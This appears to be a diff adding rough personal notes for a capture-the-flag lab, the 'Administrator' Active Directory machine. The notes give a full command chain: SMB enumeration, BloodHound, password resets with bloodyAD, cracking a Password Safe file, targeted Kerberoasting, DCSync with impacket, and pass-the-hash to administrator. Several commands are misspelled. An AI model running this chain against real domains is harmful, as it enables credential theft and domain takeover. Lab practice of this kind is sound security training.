@@ -1,0 +1,128 @@
+nmap -sV -sC -vv -oA nmap/Administrator ip address
+
+we have olivia's password
+
+nxc smb administrator -u olivia -p ichliebedich --shares
+
+nxc smb administrator -u olivia -p ichliebedich --users 
+
+do a nxc smb administrator.htb -u olivia -p ichliebedich
+
+do a nxc smb administrator -u olivia -p ichliebedich --rid-brute | grep SidTypeUser
+
+we can use rusthound or bloodhound-python 
+
+rustohound -u olivia -p ichliebedich -c All -d administrator.htb  -ns ip address
+
+start bloodhound and pass the files to bloodhound
+
+Search for olivia 
+
+mark as owned 
+
+look for outbound object control 
+First degreee object control 
+
+we can right click on the connection and see how to gain access to the connected user 
+
+or we can use bloodyAD to change the password to the new found connected user 
+
+bloodyAD -u "olivia -p ichliebedich -d administrator.htb --host ipaddress set password "username" "password"
+
+after the password has been changed successfully,
+
+mark the new user as owned
+see who the new user can access 
+
+we use blooyAD again, but this time with the new user and password we set 
+
+try to connect to ftp with the new creds found 
+
+use nxc ftp administrator.htb -u Benjamin  -p password  to see if the username and password work 
+
+if it does work,
+
+do ftp administrator.ht b
+
+enter username
+enter password 
+
+once logged in 
+
+do ls 
+
+download the files using get filename 
+
+exit ftp 
+with exit 
+
+we can use file newly downloaded file 
+
+google how to open password Safe V3 database 
+
+there is a pwsafe2john Backup file name 
+
+save the file to a text file 
+
+use john to crack the hash.txt 
+
+using john wordlist rockyou.txt hash.txt
+
+find the pwsafe github
+
+download/clone the repo 
+
+run psafe backup file 
+
+use the password that we cracked using john 
+
+copy the found password into text 
+
+try to use evilwnrm and use the found creds to login
+
+evil-winrm -i administrator -u  user -p password 
+
+once logged in
+
+do sudo -l
+to see if we have access 
+
+go back to bloodhound,
+
+find emily and mark as pwned
+
+
+go to overview and find high target values
+
+use targeted kerbroke attack
+
+download targetedkerbrose github
+
+run the targetedkerbroast attack
+
+python3 targetedkerbrost.py -u emily -p password -d administrator.htb --dc-ip ip address
+
+make sure the clock skew is synced 
+
+using sudo ntpdate ip address 
+
+copy the hash and paste into a text 
+
+use john --wordlist rockyou hash_password.txt 
+
+go back to bloodhound 
+
+mark ethcan as owned 
+
+see reachable high values or shortest path available 
+
+use impacket secretdump to do DCSync
+
+impacket-secretdump administrator.htb/ethan:password@dc.Administrator.htb
+
+look for Admin Hash:NTLM 
+
+use evil-winrm -i administrator.htb -u administrator -H NTLM Hash
+
+got root access
+
